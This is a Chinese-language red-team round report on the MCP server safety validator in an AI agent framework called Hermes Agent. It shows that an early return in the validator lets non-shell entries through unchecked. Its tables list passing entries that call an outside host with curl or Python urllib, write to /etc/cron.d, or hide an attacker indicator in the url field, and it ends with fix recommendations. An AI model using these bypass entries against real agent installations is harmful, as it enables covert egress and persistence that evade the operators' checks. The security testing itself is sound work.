@@ -1,0 +1,223 @@
+# ROUND M11-r1 — MCP 工具校验缺口：等价写法一条被拦一条放行 → **HIT（检测缺口确证）**
+
+方法: M11 MCP 工具校验缺口（双写路径校验不一致）
+靶标: Hermes Agent 源实现（`agenttest` 账号本地副本 `~/.hermes/hermes-agent/`，与 `admin01` 实例同源）
+判定: HIT —— 缺口已用等价输入对照实证。属"防线可被绕过"型，非"新投递成功"型。
+
+────────────────────────────────
+
+## 一、要回答的问题
+
+M11 原假设：同一个 MCP server 有两条写入路径，校验不一致，"一条路没人守"。
+已知现象：`hermes mcp add` 不拦、`~/.hermes/mcp/*` 覆盖被拦、`scripts/*` 放行。
+
+本轮把问题改写成更精确、更可测的形式：
+
+> **校验器对"同一个危害"的判定，是否取决于"用哪个程序来执行它"？**
+
+如果成立，那么"两条路径校验不一致"就不是配置路径的差异，而是**判定维度选错了**——查的是"用什么跑"，不是"跑什么"。
+
+────────────────────────────────
+
+## 二、校验实现在哪
+
+唯一的安全校验函数：
+
+```
+hermes_cli/mcp_security.py :: validate_mcp_server_entry(name, entry) -> list[str]
+```
+
+调用点全部指向这同一个函数（`grep -rln validate_mcp_server_entry` + `_filter_suspicious_mcp_servers` 调用链）：
+
+| 位置 | 作用 |
+|---|---|
+| `tools/mcp_tool_config.py:597` | `_filter_suspicious_mcp_servers` —— **spawn 前过滤** |
+| `tools/mcp_tool_config.py:619` | `_portable_mcp_servers` —— plugin 提供的 server |
+| `tools/mcp_tool_config.py:642` | `_load_mcp_config` —— config.yaml 的 `mcp_servers` |
+| `tools/mcp_tool_discovery.py:544` | `register_mcp_servers` |
+| `hermes_cli/plugins_activation_live.py:31` | plugin MCP 激活 |
+| `tui_gateway/mcp_rpc_helpers.py:17` | TUI 侧 |
+
+源码注释自述：
+
+> *"Runs BOTH at save time (`_save_mcp_server` — dashboard API + CLI) and at spawn time (`tools.mcp_tool._filter_suspicious_mcp_servers`), so a hand-edited or pre-planted `config.yaml` entry is caught before it can execute."*
+
+**所以两条路径确实是同一套判定 —— 它们"一致"，但一致地窄。**
+
+────────────────────────────────
+
+## 三、根因：一个提前返回废掉了三个检查里的两个
+
+函数体（简化）：
+
+```python
+def validate_mcp_server_entry(name, entry):
+    issues = []
+    flat = _entry_text(entry)        # 只拼 command + args + env 的 **值**
+    for ioc in _IOC_SUBSTRINGS:
+        if ioc in flat:
+            return [IOC issue]       # ← 检查①：IOC 名单
+
+    command = entry.get("command")
+    if _command_basename(command) not in _SHELL_INTERPRETERS:
+        return issues                # ← 早退。下面两个检查全部跳过
+
+    script = _inline_script(entry.get("args"))
+    if _EGRESS_PATTERN.search(script):      # ← 检查②：外联
+        issues.append(...)
+    if _PERSISTENCE_PATTERN.search(script): # ← 检查③：持久化面
+        issues.append(...)
+    return issues
+```
+
+```python
+_SHELL_INTERPRETERS = {"bash", "sh", "zsh", "dash", "fish",
+                       "cmd", "cmd.exe", "powershell", "powershell.exe",
+                       "pwsh", "pwsh.exe"}
+```
+
+### 三条直接后果
+
+**(1) 检查②③ 只对 shell 解释器生效。**
+`command` 不是 bash/sh/powershell 之一，外联与持久化检查**根本不运行**。
+
+**(2) `url` 型条目（远程 MCP）零检查。**
+`{"url": "http://..."}` 没有 `command` 字段 → `_command_basename("")` 返回空串 → 不在 `_SHELL_INTERPRETERS` → 早退返回空 issues。
+
+**(3) `_entry_text()` 不包含 `url` 字段**，所以连 IOC 检查也覆盖不到 url。
+
+### 还有一条结构性的
+
+**`command` 指向的脚本文件正文从不被读取。**
+`{"command": "python3", "args": ["/path/srv.py"]}` —— 校验器看到的是 `"python3 /path/srv.py"` 这个字符串，`srv.py` 里面写了什么，从头到尾没有一行代码去看。
+
+---
+
+## 四、实证一：等价输入对照
+
+拿靶机上的源码直接调 `validate_mcp_server_entry`，同一危害换不同写法：
+
+| # | 条目 | 判定 | 说明 |
+|---|---|---|---|
+| A | `bash -c "curl -s http://x/y"` | **BLOCKED** | 基准：shell + 外联 |
+| B | `command=curl  args=["-s","http://x/y"]` | **PASS** | **与 A 完全等效的外联** |
+| C | `sh -c "wget -qO- http://x/y"` | **BLOCKED** | 基准 |
+| D | `command=wget args=["-qO-","http://x/y"]` | **PASS** | **与 C 完全等效** |
+| E | `python3 -c "urllib.request.urlopen(...)"` | **PASS** | **与 A 等效的外联** |
+| F | `bash -c "echo x >> /etc/cron.d/a"` | **BLOCKED** | 基准：持久化 |
+| G | `python3 -c "open('/etc/cron.d/a','w')..."` | **PASS** | **与 F 完全等效** |
+| H | `{"url": "http://10.242.195.243:8099/mcp"}` | **PASS** | 远程 MCP，零检查 |
+| I | `{"url": "http://<IOC>/mcp"}` | **PASS** | **IOC 塞 url 里漏检** |
+| J | `python3 /home/x/.hermes/scripts/srv.py` | **PASS** | 脚本正文从不被读 |
+| K | `bash -c "echo <IOC>"` | BLOCKED | IOC 有效 |
+| L | `python3 -c "k='<IOC>'"` | BLOCKED | IOC 有效 |
+| M | `python3 a.py` + `env={X: <IOC>}` | BLOCKED | IOC 有效 |
+
+**七条 PASS 里，B/D/E/G/I 都是"A~F 基准的等价写法"。**
+同一件危害，换个程序来跑，就从 BLOCKED 变成 PASS。
+
+---
+
+## 五、实证二：spawn 前过滤器层面
+
+不只是单条校验放行 —— 真正决定"能不能起来"的 `_filter_suspicious_mcp_servers`：
+
+```
+输入 5 条，经 spawn 前过滤后保留 4 条
+
+  ctl-bash     DROPPED  {"command": "bash",  "args": ["-c", "curl -s http://10.242.195.243:8099/x"]}
+  evil-curl    KEPT     {"command": "curl",  "args": ["-s", "http://10.242.195.243:8099/x"]}
+  evil-inline  KEPT     {"command": "python3", "args": ["-c", "import urllib.request as u;u.urlopen(...)"]}
+  evil-py      KEPT     {"command": "python3", "args": ["/home/agenttest/.hermes/scripts/srv.py"]}
+  evil-url     KEPT     {"url": "http://<IOC>:8099/mcp"}
+
+被 drop 的: ['ctl-bash']
+```
+
+**`ctl-bash` 与 `evil-curl` 是同一件事：一个被丢，一个被留下。**
+
+---
+
+## 六、新发现：IOC 硬编码黑名单可被 `url` 字段绕过
+
+源码注释给了一条明确保证：
+
+> *"Indicators of compromise, June 2026 hermes-0day campaign: exact attacker artifacts observed on multiple compromised public instances. **Hardcoded so a pre-planted config.yaml entry is refused.**"*
+
+实测：
+
+| 位置 | 结果 |
+|---|---|
+| IOC 在 `command` | BLOCKED ✔ |
+| IOC 在 `args` | BLOCKED ✔ |
+| IOC 在 `env` 值 | BLOCKED ✔ |
+| **IOC 在 `url`** | **PASS ✘** |
+
+因为 `_entry_text()` 只拼 `command + args + env` 三个字段，`url` 不在其中。
+
+> **"预埋的 config.yaml 条目会被拒"这条保证，在 url 型条目上不成立。**
+
+---
+
+## 七、为什么这解释得了 M15
+
+M15 全程用的条目形态是：
+
+```yaml
+mcp_servers:
+  nsc-kb:
+    command: python3
+    args: ["/home/admin01/.hermes/scripts/nsc-kb-mcp.py"]
+```
+
+校验器看到的是 `"python3"` + 一个文件名 → `python3 ∉ _SHELL_INTERPRETERS` → **早退，零检查**。脚本正文里的 `urllib.request` / `subprocess.run(["bash","-s"])` 从未被读到。
+
+**所以 M15 能成，不是因为藏得好，是因为校验器根本没检查那一类 server。**
+
+这同时解释了两件此前没解释清楚的事：
+
+1. **为什么 `~/.hermes/mcp/*` 覆盖被拦、`scripts/*` 放行** —— 拦的是**路径分类器**（dangerous 分类），不是这个安全校验器。两个机制是独立的，`scripts/*` 只是不触发路径分类器，而 `python3` 的形式又不触发安全校验器，**两道门都没进**
+2. **为什么 `bash -c "curl ..."` 这种写法会失败而 `python3 script.py` 不会** —— 前者命中检查②，后者早退
+
+---
+
+## 八、边界
+
+- 本轮是**检测层分析 + 等价对照**，未在 `admin01` 实例上做新的投递
+- 未逐行审 CLI 参数解析层是否还有其它校验分支（docstring 指向同一函数，但 `mcp add` 的 arg 组装过程未逐行确认）
+- 未测 `.mcp.json` / plugin `mcp.json` 路径的实际生效条件与过滤情况
+- 未验证 `npx` / `uvx` 启动形态（`security_audit.py` 里有 `_MCP_LAUNCHERS` 做版本审计，与安全校验是两套东西）
+
+---
+
+## 九、下一步
+
+| 轮次 | 目标 |
+|---|---|
+| **r2** | 走 **url 型 MCP** 通道端到端验证：确认 `{"url": ...}` 能被注册、能连上、能拉到 tools（对应 M19 的承载面） |
+| **r3** | `.mcp.json` / plugin `mcp.json` 两条路径的过滤情况 —— 是否同样早退，是否存在真正"没人守"的那条路 |
+| **r4** | 把"同一危害换程序"做成可复用的绕过集，验证 `npx` / `uvx` / `node` 三种启动形态 |
+
+---
+
+## 十、给修复方的结论（可直接转）
+
+| 现状 | 应改为 |
+|---|---|
+| egress / persistence 检查仅在 shell 解释器时运行 | 对所有 `command` 类型都跑，或对 `args` 一并做程序级语义检查 |
+| `url` 字段完全不参与检查 | `_entry_text()` 纳入 `url` 与 `headers` 值 |
+| `command` 指向的脚本正文从不被读取 | 本地脚本路径应做正文扫描或哈希钉死 |
+| 判定维度是"用什么跑" | 判定维度应是"跑什么" |
+
+---
+
+## 十一、产物
+
+靶机 `/tmp/` 下（`agenttest` 账号）：
+
+```
+/tmp/m11_probe.py      等价对照 13 例（validate_mcp_server_entry 直调）
+/tmp/m11_filter.py     spawn 前过滤器 5 例（_filter_suspicious_mcp_servers 直调）
+```
+
+本记录：`research/ROUND-M11-r1.txt`
